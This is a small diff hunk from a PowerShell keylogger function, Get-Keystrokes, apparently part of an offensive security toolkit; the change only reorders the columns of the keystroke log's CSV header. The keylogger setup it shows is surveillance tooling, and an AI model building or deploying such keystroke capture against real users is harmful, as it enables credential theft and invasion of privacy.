@@ -49,7 +49,7 @@ function Get-Keystrokes {
     $Initilizer = {
         $LogPath = 'REPLACEME'
 
-        '"TypedKey","Time","WindowTitle"' | Out-File -FilePath $LogPath -Encoding unicode
+        '"WindowTitle","TypedKey","Time"' | Out-File -FilePath $LogPath -Encoding unicode
 
         function KeyLog {
             [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
